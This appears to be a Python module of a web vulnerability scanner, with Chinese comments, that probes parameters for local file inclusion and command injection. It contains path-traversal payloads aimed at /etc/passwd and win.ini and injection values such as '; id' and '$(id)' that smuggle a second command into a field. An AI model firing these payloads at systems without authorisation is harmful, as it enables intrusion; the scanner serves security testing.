"""
本地文件包含（LFI）/ 命令注入检测
Author: 火柴 | GitHub: huocai250
v4.0: 测试真实注入点 + 并发；命令注入用回显特征匹配
"""
import re
from core.scanner import BaseScanner
from core.colors import log
from utils.http import build_url

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2Fetc%2Fpasswd",
    "..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
    "%2e%2e%5cwindows%5cwin.ini",
]

LFI_PARAMS = ["file", "page", "include", "path", "doc", "document",
              "folder", "root", "pg", "style", "template", "php_path",
              "load", "read", "lang", "locale", "module", "view"]

LFI_SIGNATURES = [
    r"root:.*:0:0:", r"\[boot loader\]", r"\[fonts\]",
    r"daemon:.*:/usr", r"/bin/bash", r"/bin/sh",
    r"for 16-bit app support", r"\[extensions\]",
]

CMD_PAYLOADS = [
    "; id",        "| id",      "& id",
    "; whoami",    "| whoami",
    "`id`",        "$(id)",
    "; ping -c 1 127.0.0.1",
]

CMD_SIGNATURES = [
    r"uid=\d+.*gid=\d+", r"groups=\d+",
    r"PING.*127\.0\.0\.1.*bytes of data",
]

CMD_PARAMS = ["cmd", "exec", "command", "execute", "ping", "query",
              "jump", "code", "reg", "do", "func", "exp", "host", "ip"]


class LFIScanner(BaseScanner):
    name = "lfi"

    def run(self):
        log("INFO", "LFI / 命令注入检测（并发）...")
        lfi_targets = self._targets(LFI_PARAMS)
        cmd_targets = self._targets(CMD_PARAMS)
        self.map(self._test_lfi, lfi_targets)
        self.map(self._test_cmd, cmd_targets)

    def _targets(self, common):
        """结合发现的注入点与模块自有常见参数名。"""
        out = []
        seen = set()
        for ip in self.ctx.injection_points:
            for pname in ip["params"]:
                key = (ip["url"], ip["method"], pname)
                if key not in seen:
                    seen.add(key)
                    out.append((ip["url"], ip["method"], dict(ip["params"]), pname))
        # 追加自有常见参数（GET，种子 URL）
        for pname in common:
            key = (self.target, "GET", pname)
            if key not in seen:
                seen.add(key)
                out.append((self.target, "GET", {pname: "1"}, pname))
        return out

    def _req(self, method, url, params):
        if method == "POST":
            return self.post(url, data=params)
        return self.get(build_url(url, params))

    def _test_lfi(self, target):
        url, method, params, pname = target
        for payload in LFI_PAYLOADS:
            test = dict(params); test[pname] = payload
            r = self._req(method, url, test)
            if r and any(re.search(p, r.text) for p in LFI_SIGNATURES):
                log("VULN", f"[LFI] 参数: {pname} | {payload}")
                self.add("文件包含", "CRITICAL",
                         f"[LFI] 参数 '{pname}' 存在本地文件包含",
                         f"Payload: {payload} @ {url}", url=url)
                return f"lfi:{pname}@{url}"
        return None

    def _test_cmd(self, target):
        url, method, params, pname = target
        for payload in CMD_PAYLOADS:
            test = dict(params); test[pname] = payload
            r = self._req(method, url, test)
            if r and any(re.search(p, r.text) for p in CMD_SIGNATURES):
                log("VULN", f"[命令注入] 参数: {pname} | {payload}")
                self.add("命令注入", "CRITICAL",
                         f"[RCE] 参数 '{pname}' 疑似命令注入",
                         f"Payload: {payload} @ {url}", url=url)
                return f"cmd:{pname}@{url}"
        return None
